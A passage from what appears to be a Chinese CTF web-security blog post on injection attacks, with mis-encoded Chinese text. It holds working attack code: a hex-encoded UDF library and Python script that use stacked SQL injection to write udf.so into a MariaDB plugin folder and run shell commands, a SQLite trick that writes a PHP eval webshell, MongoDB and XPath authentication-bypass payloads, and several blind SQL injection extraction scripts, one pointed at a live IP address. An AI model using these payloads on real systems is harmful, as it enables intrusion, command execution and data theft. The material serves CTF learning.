74007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span></span><br><span class="line">codes=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(code),<span class="number">128</span>):</span><br><span class="line">	codes.append(code[i:<span class="built_in">min</span>(i+<span class="number">128</span>,<span class="built_in">len</span>(code))])</span><br><span class="line"></span><br><span class="line"><span class="comment">#å»ºä¸´æ—¶è¡¨</span></span><br><span class="line"><span class="comment">#sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line"><span class="comment">#requests.get(url+payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ¸…ç©ºä¸´æ—¶è¡¨</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ’å…¥ç¬¬ä¸€æ®µæ•°æ®</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>])</span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ›´æ–°è¿æ¥å‰©ä½™æ•°æ®</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(codes)):</span><br><span class="line">	sql=<span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k])</span><br><span class="line">	payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">	requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#10.3.18-MariaDB	</span></span><br><span class="line"><span class="comment">#å†™å…¥soæ–‡ä»¶</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¼•å…¥è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å‘½ä»¤æ‰§è¡Œï¼Œç»“æœæ›´æ–°åˆ°ç•Œé¢</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹ç»“æœ</span></span><br><span class="line">r=requests.get(url[:-<span class="number">4</span>]+<span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h3><h4 id="å†…ç½®è¡¨æŸ¥è¯¢"><a href="#å†…ç½®è¡¨æŸ¥è¯¢" class="headerlink" title="å†…ç½®è¡¨æŸ¥è¯¢"></a>å†…ç½®è¡¨æŸ¥è¯¢</h4><blockquote><p>sqlite_masterç›¸å½“äºmysqlçš„information_schemaï¼Œä½†æ˜¯è¿™é‡Œåªå­˜æœ‰è¡¨çš„ä¿¡æ¯ï¼Œé‡Œé¢æœ‰ä¸ªsqlå­—æ®µï¼Œæœ‰å„ä¸ªè¡¨çš„ç»“æ„ï¼Œæœ‰è¡¨åã€å­—æ®µåå’Œç±»å‹ã€‚</p></blockquote><p><code>select name,sql from sqlite_master</code></p><p><code>select group_concat(sql) from sqlite_master</code></p><h4 id="å†™webshell"><a href="#å†™webshell" class="headerlink" title="å†™webshell"></a>å†™webshell</h4><p>SQLite çš„ ATTACH DATABASE è¯­å¥æ˜¯ç”¨æ¥é€‰æ‹©ä¸€ä¸ªç‰¹å®šçš„æ•°æ®åº“ï¼Œä½¿ç”¨è¯¥å‘½ä»¤åï¼Œæ‰€æœ‰çš„ SQLite è¯­å¥å°†åœ¨é™„åŠ çš„æ•°æ®åº“ä¸‹æ‰§è¡Œã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE file_name <span class="keyword">AS</span> database_name;</span><br></pre></td></tr></table></figure><p>å¦‚æœé™„åŠ æ•°æ®åº“ä¸å­˜åœ¨ï¼Œå°±ä¼šåˆ›å»ºè¯¥æ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“æ–‡ä»¶è®¾ç½®åœ¨webç›®å½•ä¸‹ï¼Œå°±å¯ä»¥å†™å…¥webshellã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span> <span class="keyword">AS</span> shell;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> shell.<span class="built_in">exp</span> (webshell text); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">INTO</span> shell.<span class="built_in">exp</span> (webshell) <span class="keyword">VALUES</span> (<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h3><h4 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h4><p>ä¸‡èƒ½å¯†ç ï¼š<code>&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></p><p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MongoDB æ³¨å…¥æŒ‡åŒ—</a></p><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/docs/manual/">MongoDB Documentation</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9908">Nosql æ³¨å…¥ä»é›¶åˆ°ä¸€</a></p><p>â€‹</p><h3 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h3><p>XPath å³ä¸º XML è·¯å¾„è¯­è¨€ï¼Œæ˜¯ W3C XSLT æ ‡å‡†çš„ä¸»è¦å…ƒç´ ï¼Œå®ƒæ˜¯ä¸€ç§ç”¨æ¥ç¡®å®š XMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„å­é›†ï¼‰æ–‡æ¡£ä¸­æŸéƒ¨åˆ†ä½ç½®çš„è¯­è¨€ã€‚</p><p>XpathæŸ¥è¯¢è¯­å¥ï¼š</p><p><code>$query=&quot;user/username[@name=&#39;&quot;.$user.&quot;&#39;]&quot;;</code></p><ul><li>æ³¨å…¥ç‚¹ï¼šURLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„ XPath æŸ¥è¯¢ä»£ç </li><li>æ³¨å…¥æ¼æ´éªŒè¯ï¼šè¾“å…¥<code>id=1&#39;</code>ã€<code>`id=-1</code>çœ‹é¡µé¢æ˜¯å¦è¿”å›æŠ¥é”™ä¿¡æ¯</li><li>æ³¨å…¥ä¸‡èƒ½å…¬å¼ï¼š<code>id=1&#39; or 1=1 or &#39;&#39;=&#39;</code></li><li>ä¸‡èƒ½è®¿é—®xmlæ–‡æ¡£æ‰€æœ‰èŠ‚ç‚¹çš„payload: <code>&#39;]|//*|//*[&#39;</code></li></ul><p>â€‹</p><h3 id="å¸¸ç”¨è„šæœ¬"><a href="#å¸¸ç”¨è„šæœ¬" class="headerlink" title="å¸¸ç”¨è„šæœ¬"></a>å¸¸ç”¨è„šæœ¬</h3><ul><li><h4 id="å¸ƒå°”ç›²æ³¨-1"><a href="#å¸ƒå°”ç›²æ³¨-1" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic=<span class="string">&#x27;&#123;&#125;-_&#x27;</span>+string.digits+string.ascii_lowercase</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;xxxxxxx&#x27;</span></span><br><span class="line">now=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	flag=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">		payload=<span class="string">&#x27;&#x27;&#x27;xxxxxxx&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>()</span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;xxxxx&#x27;</span>&#125;</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		<span class="comment">#print(r.text)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;xxx&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			now+=j</span><br><span class="line">			<span class="built_in">print</span>(now)</span><br><span class="line">			flag=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select(database())),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;100&#x27;)||<span class="subst">&#123;payload&#125;</span>||(&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="comment"># r = requests.post(url,data=data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;xxx&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mysql8æ–°ç‰¹æ€§</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bind_sql</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    dic = <span class="string">&quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/-,+*)(&amp;%$#!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        f = flag</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            _ = flag + j</span><br><span class="line">            <span class="comment">#payload = &quot;0||(binary&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/0,1)&quot;.format(_)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0||(&#x27;cnss&#x27;,binary&#x27;&#123;&#125;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1,1)&quot;.format(_)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0||(&#x27;2&#x27;,&#x27;lisi&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/users/**/limit/**/1,1)&quot;.format(_)</span></span><br><span class="line">            payload = <span class="string">&quot;0||(&#x27;8&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/cn55/**/limit/**/7,1)&quot;</span>.<span class="built_in">format</span>(_)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url=url, params=data)</span><br><span class="line">            <span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;xxx&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    flag = flag[:-<span class="number">1</span>] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    exit()</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == f:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># input url</span></span><br><span class="line">    url = <span class="string">&#x27;http://124.221.34.13:55553/&#x27;</span></span><br><span class="line">    result = bind_sql()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ul><ul><li><h4 id="æ—¶é—´ç›²æ³¨-1"><a href="#æ—¶é—´ç›²æ³¨-1" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&#x27;&#123;&#125;-_,&#x27;</span>+string.ascii_lowercase+string.digits</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;xxxxxx&#x27;</span></span><br><span class="line">now=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	flag=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">		a=time.time()</span><br><span class="line">		payload=<span class="string">&#x27;&#x27;&#x27;xxxxxx&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>()</span><br><span class="line">		data=&#123;<span class="string">&#x27;ip&#x27;</span>:payload,<span class="string">&quot;debug&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		b=time.time()</span><br><span class="line">		<span class="keyword">if</span> b-a&gt;<span class="number">1</span>:</span><br><span class="line">			now+=j</span><br><span class="line">			flag=<span class="number">1</span></span><br><span class="line">			<span class="built_in">print</span>(now)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxx/?id=1%22and%20&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select/**/group_concat(xxx)from(yyy.zzz)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.6),0)%23&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># data = &#123;</span></span><br><span class="line">        	<span class="comment">#    &#x27;uname&#x27;:f&quot;admin&#x27;)and &#123;payload&#125;#&quot;,</span></span><br><span class="line">        	<span class="comment">#    &#x27;passwd&#x27;: &#x27;1&#x27;</span></span><br><span class="line">        	<span class="comment"># &#125;</span></span><br><span class="line">            r = requests.get(url + payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="comment"># r = requests.post(url, data=data, timeout=0.5)</span></span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ul></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2020/05/16/web-fuzz%E6%94%B6%E9%9B%86/" title="fuzzæ”¶é›†"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;ä¸Šä¸€ç¯‡</span></a></li><li class="next"><a href="/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="ååºåˆ—åŒ–"><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>èµ</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨ï¼Œèµä¸€æ¯å’–å•¡â˜•~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€æ”¯ä»˜å®æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> å¾®ä¿¡æ”¯ä»˜</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> æ”¯ä»˜å®</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>æ€»è®¿é—® - <span id="busuanzi_value_site_pv"></span>æ¬¡</span><br><span>è®¿å®¢æ•° - <span id="busuanzi_value_site_uv"></span>äºº</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"ç±»åˆ«",TAGS:"å…³é”®è¯",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new 